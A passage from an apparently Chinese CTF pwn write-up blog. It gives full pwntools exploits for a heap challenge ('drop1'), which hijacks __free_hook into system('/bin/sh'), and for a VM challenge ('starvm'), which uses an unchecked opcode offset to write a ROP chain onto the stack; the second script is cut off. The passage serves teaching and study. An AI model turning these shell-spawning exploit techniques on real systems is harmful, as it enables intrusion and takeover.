&quot;</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
<ul>
<li>上面这个堆风水就是猜出来的，遇到这种不好分析的题目一定不要执着于逆向，要适当猜测数据</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./drop1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;item:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,data</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;content:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble</span>(<span class="params">key,idx</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;West/East?&quot;</span>,<span class="built_in">str</span>(key))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i+<span class="number">1</span>)*<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">bubble(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&quot;The 1th item: \n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x2a70</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">bubble(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">ru(<span class="string">&quot;The 8th item: \n&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i+<span class="number">1</span>)*<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">bubble(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">add(p64(system).ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">bubble(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="starvm"><a href="#starvm" class="headerlink" title="starvm"></a>starvm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3<span class="number">.1</span>)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">starvm: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=f7648c6285dbb9299e6ee84f7b48f53de6626be6, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Partial RELRO，Canary，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序的核心结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Chunk struc ; (<span class="keyword">sizeof</span>=<span class="number">0x7C</span>, mappedto_9)</span><br><span class="line"><span class="number">00000000</span> cmd_listp dq ?                          ; offset</span><br><span class="line"><span class="number">00000008</span> next dq ?                               ; offset</span><br><span class="line"><span class="number">00000010</span> field_10 dq ?</span><br><span class="line"><span class="number">00000018</span> data_list dq ?                          ; offset</span><br><span class="line"><span class="number">00000020</span> data1 dq ?                              ; offset</span><br><span class="line"><span class="number">00000028</span> data2 dq ?                              ; offset</span><br><span class="line"><span class="number">00000030</span> cmd_list dq ?                           ; offset</span><br><span class="line"><span class="number">00000038</span> answer dd <span class="number">14</span> dup(?)</span><br><span class="line"><span class="number">00000070</span> answer_addr dq ?                        ; offset</span><br><span class="line"><span class="number">00000078</span> answer2 dd ?</span><br><span class="line"><span class="number">0000007</span>C Chunk ends</span><br></pre></td></tr></table></figure>
<p>在 <code>case-10</code> 中没有 offset 检查，可以溢出到核心结构体中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">10</span>:                                <span class="comment">// lea</span></span><br><span class="line">  indext = index;</span><br><span class="line">  ++cmd_list;</span><br><span class="line">  index += <span class="number">2</span>;</span><br><span class="line">  chunk-&gt;answer[chunk-&gt;data_list[indext]] = chunk-&gt;data_list[indext + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">12</span>:                                <span class="comment">// lea3</span></span><br><span class="line">  data1 = chunk-&gt;data1;</span><br><span class="line">  indext = index;</span><br><span class="line">  ++cmd_list;</span><br><span class="line">  ++index;</span><br><span class="line">  chunk-&gt;answer[chunk-&gt;data_list[indext]] = *(data1 - <span class="number">1</span>);</span><br><span class="line">  chunk-&gt;data1 = data1 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>由于程序是提供了 stack_addr 的，通过程序的溢出，可以将 answer_addr 覆盖为 stack_addr，然后就可以修改栈上的数据了</p>
<p>劫持栈，利用 puts 泄露 libc_base，然后写 main 函数地址循环执行程序：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&quot;your vm starts at &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>)) </span><br><span class="line">stack_base = leak_addr - <span class="number">8</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;stack_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line">stack_addr1 = (stack_base) % <span class="number">0x100000000</span></span><br><span class="line">stack_addr2 = (stack_base &gt;&gt; <span class="number">32</span>) % <span class="number">0x100000000</span></span><br><span class="line">main_addr = <span class="number">0x4012B0</span></span><br><span class="line">puts_got = <span class="number">0x401240</span></span><br><span class="line">printf_got = <span class="number">0x404018</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004017cb</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;command:&quot;</span>,<span class="string">&quot;10 10 10 10 10 10 7 7 7 7 7 7 7 16&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;your cost:&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;14&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(stack_addr1))</span><br><span class="line">sl(<span class="string">&quot;15&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(stack_addr2))</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(puts_got))</span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(pop_rdi_ret))</span><br><span class="line">sl(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(printf_got))</span><br><span class="line">sl(<span class="string">&quot;8&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(main_addr))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;8&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;7&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0xDEADBEEF</span>))</span><br></pre></td></tr></table></figure>
<p>最后在栈上覆盖一个 ROP 就可以了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./starvm1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\nb* 0x4017CC\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *0x4018B6\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">ru(<span class="string">&quot;your vm starts at &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>)) </span><br><span class="line">stack_base = leak_addr - <span class="number">8</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;stack_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line">stack_addr1 = (stack_base) % <span class="number">0x100000000</span></span><br><span class="line">stack_addr2 = (stack_base &gt;&gt; <span class="number">32</span>) % <span class="number">0x100000000</span></span><br><span class="line">main_addr = <span class="number">0x4012B0</span></span><br><span class="line">puts_got = <span class="number">0x401240</span></span><br><span class="line">printf_got = <span class="number">0x404018</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004017cb</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x00000000004016f0</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;command:&quot;</span>,<span class="string">&quot;10 10 10 10 10 10 7 7 7 7 7 7 7 16&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;your cost:&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;14&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(stack_addr1))</span><br><span class="line">sl(<span class="string">&quot;15&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(stack_addr2))</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(puts_got))</span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(pop_rdi_ret))</span><br><span class="line">sl(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(printf_got))</span><br><span class="line">sl(<span class="string">&quot;8&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(main_addr))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;8&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;7&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0xDEADBEEF</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x134d50</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; 